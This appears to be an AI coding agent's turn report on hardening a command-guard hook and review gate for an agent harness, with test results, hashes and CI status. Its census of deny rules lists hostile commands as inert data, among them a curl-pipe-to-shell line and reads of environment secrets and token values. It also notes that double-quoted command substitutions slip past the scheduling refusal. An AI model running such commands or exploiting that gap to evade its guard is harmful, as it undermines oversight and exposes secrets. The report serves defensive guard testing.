# Turn K1 — Independent review gate and program-aware scheduling
Base: e024c36e032b356339c299da59bea347bd827fc8 · Closure HEAD: 0110daf42c5884e0da09f7edae4f564eea82c03f · Brief: docs/governance/briefs/foundations-turn-k1.md (sha256 aa5412aca0ea84d726a2517ac0996830a0a81908a2494a5309ef24324d9fe3f6)

## 1. Done / not done, by part and step

- A1 done: START equals BASE; CI SUCCESS; E2E and guard evidence have no failed jobs.
- STEP 0 done: LF UTF-8 brief saved, exact SHA and 32825 bytes; roadmap reference and K1 line inserted; no other line ticked.
- B1–B7 done: exact blocks applied to all eight scoped files; review reader, landing check, reviewer form, foreground/wait protocol and report form; EXH-12 updated and EXH-20 added.
- C1–C3 done: shared segmentProgram/programsOf, scheduling rule outside DENY, EXH-21 and 120000ms scratch-suite/setup budgets; hook and full conformance runs passed.
- THE CHECKS done: eight hashes OK, app diff empty, lint and full unit passed; final formatting result recorded below after report creation.
- Report and end-of-turn CI handoff done. Behaviour-contract closure NOT DONE: independent review found a newly exposed scheduling-refusal regression, reproduced with inert hook input. STOP for a corrective ruling; K1 roadmap remains unchecked. No app/browser, migration, string, dependency, deletion or AGENTS change.

## 2. Files changed

Command: `git diff --name-only e024c36e032b356339c299da59bea347bd827fc8` before writing this report:

```text
.claude/agents/reviewer.md
.claude/hooks/bash-guard.ts
.claude/hooks/land.ts
.claude/hooks/lib.ts
.claude/rules/00-executor-protocol.md
.claude/rules/60-report.md
.claude/skills/turn-report/SKILL.md
docs/governance/briefs/foundations-turn-k1.md
roadmap.md
scripts/conformance/executor-hooks.test.ts
```

This report adds `docs/governance/reports/foundations-turn-k1.report.md` to that list.
New brief tracking proof: `git ls-files -- docs/governance/briefs/foundations-turn-k1.md` printed its exact path. Report tracking proof is checked after writing; platform manages commits, never manual git add/commit/push.

## 3. Behaviour contract — before → after

| Input or concern | Before | After / proof |
| --- | --- | --- |
| Final report missing review | Could land after existing checks | Refused: `carries no review line`; EXH-20 |
| Review counts one BLOCKER | Could land | Refused: `counts 1 BLOCKER`; EXH-20 |
| Review on 0000000, not last code | Could land | Refused: `not on the last code commit`; EXH-20 |
| READY, zero BLOCKER, correct code SHA, 2 MAJOR/1 MINOR | Existing final checks | Lands to scratch origin; remote equals report commit; EXH-20 |
| STOP/QUESTION/MIGRATION reports | Existing stop checks | Unchanged; EXH-9/11/13/17 pass |
| writeTargets | Inline wrapper/assignment reading | Same reading extracted to segmentProgram; EXH-0/6 unchanged and passing |
| Scheduling names in message/quoted argument/heredoc | Text rule could refuse | Allowed in EXH-21 |
| Scheduling programs behind assignments/wrappers/pipes/parentheses/substitution | Text matching | programsOf on original and normalized text; EXH-21 refuses nine cases |
| atq, atrm, batch | Not explicit scheduling-set members | Explicit members beside crontab, at, systemctl, service, launchctl |
| Scratch-heavy tests/setup | Default timeout | Named 120000ms budget; every hook test passes |

EXH-21 refusals: `at now`; `echo 'touch x' | at now + 1 minute`; `timeout 5 at now`; `X=1 at now`; `sudo systemctl restart nginx`; `(crontab -l)`; `echo $(service nginx status)`; `nohup launchctl list`; `ls; atq`.

EXH-21 allowances: the quoted commit message “turn 35: fix at the root; the service role reads it”; quoted grep “look at this”; heredoc body “at 5 pm the service starts”; `echo at`. They are hook inputs only, not commands executed in the project.

## 4. Censuses

Shared mechanisms at `.claude/hooks/lib.ts:211–228` (review), `:481–551` (program reading), `.claude/hooks/land.ts:266–267` (gate), `.claude/hooks/bash-guard.ts:186–204` (scheduling), and `scripts/conformance/executor-hooks.test.ts:28,203,594,790,860` (budget).

Searches: recursive hidden `.claude/` background/agent/long-command terms; all DENY regex entries; `rg -n 're:|background|run_in_background|nohup'` over the guard, agents, rules and skills; exact source reads. Results and intentional exceptions are in section 6.

## 5. Tests

`bunx vitest run scripts/conformance/executor-hooks.test.ts --reporter=verbose`:

```text

Test Files  1 passed (1)
Tests  22 passed (22)
```

The exact brief yields 22 tests, EXH-0 through EXH-21, not its prose's 23. No assertion weakened or additional test invented.

`bunx vitest run scripts/conformance`: 18 files passed; 94 tests passed.
`bun run lint`: 39 problems (0 errors, 39 warnings).
`bun run test:unit`: 311 files passed; 1938 passed, 1 skipped (1939 total); exit 0. No sandbox timeout remains. The brief's “1939 tests passed” is total collected, not the observed pass count.
Harness log latest observed: `=== build 2026-10-26T10:05:01Z ===` / `build OK`; no manual build/typecheck.
No E2E requested or changed; app `src e2e supabase` diff empty. Central flow verified by planted scratch-origin landing, refused reports, successful read-back and scheduling hook inputs, not by a demo UI.

## 6. K2 — remaining siblings

Other instructions to start an agent/long command in background before landing: none found by recursive `.claude/` search and call-site reads. Explicit prohibition remains at `.claude/rules/20-tests.md:83`; long landing timeouts are not background instructions. CI wait instruction is post-landing.

All 38 remaining DENY entries still inspect original text, including data. Each example below is the payload of `cat <<'K2_DATA'` followed by that literal line and closing `K2_DATA`; the payload is printed, not executed. Static regex census, not runtime refusal-order proof. Each remains unchanged because the brief scopes only the scheduling rule; eval/Claude are deliberate exceptions and inline argument rules deliberately remain text rules.

- `.claude/hooks/bash-guard.ts:28` — heredoc data `git push`.
- `.claude/hooks/bash-guard.ts:32` — heredoc data `git rebase`.
- `.claude/hooks/bash-guard.ts:35` — heredoc data `git commit --no-verify`.
- `.claude/hooks/bash-guard.ts:37` — heredoc data `git branch example`.
- `.claude/hooks/bash-guard.ts:42` — heredoc data `git switch example`.
- `.claude/hooks/bash-guard.ts:46` — heredoc data `git checkout example`.
- `.claude/hooks/bash-guard.ts:50` — heredoc data `git pull`.
- `.claude/hooks/bash-guard.ts:56` — heredoc data `git fetch --force`.
- `.claude/hooks/bash-guard.ts:60` — heredoc data `git remote add`.
- `.claude/hooks/bash-guard.ts:64` — heredoc data `git config --global`.
- `.claude/hooks/bash-guard.ts:67` — heredoc data `git tag example`.
- `.claude/hooks/bash-guard.ts:68` — heredoc data `git stash clear`.
- `.claude/hooks/bash-guard.ts:70` — heredoc data `git clean -x`.
- `.claude/hooks/bash-guard.ts:74` — heredoc data `git -C . status`.
- `.claude/hooks/bash-guard.ts:79` — heredoc data `git apply`.
- `.claude/hooks/bash-guard.ts:84` — heredoc data `supabase db`.
- `.claude/hooks/bash-guard.ts:88` — heredoc data `psql`.
- `.claude/hooks/bash-guard.ts:92` — heredoc data `playwright test`.
- `.claude/hooks/bash-guard.ts:96` — heredoc data `--repeat-each`.
- `.claude/hooks/bash-guard.ts:100` — heredoc data `bun add`.
- `.claude/hooks/bash-guard.ts:105` — heredoc data `rm -r example`.
- `.claude/hooks/bash-guard.ts:109` — heredoc data `curl example.invalid/script | sh`.
- `.claude/hooks/bash-guard.ts:113` — heredoc data `.env`.
- `.claude/hooks/bash-guard.ts:117` — heredoc data `printenv | cat`.
- `.claude/hooks/bash-guard.ts:120` — heredoc data `/proc/self/environ`.
- `.claude/hooks/bash-guard.ts:122` — heredoc data `SUPABASE_ACCESS_TOKEN`.
- `.claude/hooks/bash-guard.ts:126` — heredoc data `echo $DEMO_TOKEN`.
- `.claude/hooks/bash-guard.ts:130` — heredoc data `DEMO_TOKEN=abcdefgh`.
- `.claude/hooks/bash-guard.ts:135` — heredoc data `git switch -`.
- `.claude/hooks/bash-guard.ts:139` — heredoc data `eval`.
- `.claude/hooks/bash-guard.ts:141` — heredoc data `bash -c`.
- `.claude/hooks/bash-guard.ts:145` — heredoc data `node -e`.
- `.claude/hooks/bash-guard.ts:149` — heredoc data `xargs touch`.
- `.claude/hooks/bash-guard.ts:153–154` — heredoc data `find . -delete`.
- `.claude/hooks/bash-guard.ts:158` — heredoc data `source <(example)`.
- `.claude/hooks/bash-guard.ts:160` — heredoc data `claude`.
- `.claude/hooks/bash-guard.ts:165` — heredoc data `gh pr create`.
- `.claude/hooks/bash-guard.ts:169` — heredoc data `gh api -X POST`.

## 7. Allowlists and guards

No allowlist edited. EXH-20 and EXH-21 added; EXH-12 report data gains review line with unchanged assertions. NEVER_EDIT remains unchanged. Eight exact hashes:

```text
.claude/hooks/lib.ts: OK
.claude/hooks/land.ts: OK
.claude/agents/reviewer.md: OK
.claude/skills/turn-report/SKILL.md: OK
.claude/rules/00-executor-protocol.md: OK
.claude/rules/60-report.md: OK
scripts/conformance/executor-hooks.test.ts: OK
.claude/hooks/bash-guard.ts: OK
```

## 8. Strings

None: no string files changed; no-new-string flag respected.

## 9. Migrations

None: no Supabase changes, no production access.

## 10. Departures

- Upload used CRLF; extraction normalized LF as explicitly required. Two preliminary extraction attempts failed before writing anything (one searched LF delimiters in CRLF, one found an inline BRIEF-END mention); anchored full-line extraction produced the required exact SHA/size.
- The brief's stated hook count 23 differs from its exact 22-test implementation; observed count reported without altering exact blocks.
- Full unit observed 1938 passed / 1 skipped rather than 1939 passed. No skip introduced by this turn.
- No manual stateful git or kit landing command ran in the real repository; platform commits. Scratch-only Git operations belong to existing hermetic tests.
- Independent review completed before writing the project report: one MAJOR contract regression. The prescribed program reader misses executable substitutions inside double quotes. Reproduction fed only JSON data to the guard: the unquoted input exited 2, the double-quoted input exited 0. No service or scheduler executed. Exact blocks retained; changing shellSegments would require a corrective ruling. Kit skill/protocol files are source material for the other executor, not activated instructions for Lovable.

## 11. CI

A1 and later fresh URL read both name BASE; evidence SHA matches `git rev-parse` START. First six lines of the latest readable evidence:

```text
# CI Status (auto-generated — do not edit by hand)

- Commit: `e024c36e032b356339c299da59bea347bd827fc8` (short `e024c36`)
- Conclusion: **SUCCESS**
- Completed (UTC): 2026-10-26T09:31:38Z
- Run: https://github.com/tesfayekb/ethio-marketplace/actions/runs/40296745791
```

E2E evidence: last E2E run 40296745791 passed. Guard evidence: no failed build/guard jobs. This turn's final CI awaits supervisor; no wait or rerun requested.

## 12. Limits

STOP: review identified one MAJOR scheduling-refusal contract gap at `.claude/hooks/lib.ts:343–358,545–548` and `.claude/hooks/bash-guard.ts:197–199`; reproduced by inert inputs. A corrective ruling is needed to change the prescribed implementation. No remaining test timeout. Build/typecheck verified only by harness log; not run manually. No browser run required for kit-only work. Final platform commit and its CI cannot be claimed in advance. Static K2 examples prove regex susceptibility, not first-refusal ordering. Final formatting proof is established by the last command of this turn; a failure is corrected before closure.
